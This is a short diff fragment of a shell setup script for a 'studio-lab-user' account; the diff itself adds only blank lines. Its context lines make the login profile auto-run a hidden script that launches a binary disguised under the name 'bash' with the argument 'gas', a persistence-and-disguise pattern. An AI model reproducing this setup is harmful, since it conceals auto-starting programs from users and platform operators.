@@ -19,3 +19,5 @@ echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
 echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
 echo "./.lib/bash gas" > /home/studio-lab-user/.lib/gas.sh
 chmod +x gas && cd ~/ && source .bashrc
+
+
